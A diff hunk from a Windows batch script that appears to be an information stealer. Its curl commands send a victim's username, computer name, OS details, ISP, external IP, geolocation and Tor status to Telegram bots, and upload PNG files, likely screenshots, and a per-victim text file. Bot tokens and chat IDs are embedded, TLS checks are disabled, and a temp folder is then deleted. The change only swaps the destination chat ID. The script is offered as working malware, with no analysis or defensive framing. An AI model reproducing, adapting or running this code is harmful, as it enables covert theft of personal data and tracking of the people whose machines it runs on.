@@ -65,7 +65,7 @@ set "ExtIPTor=N/A"
 
 curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
 for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
-curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-521008070 -k --insecure
+curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure
 
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
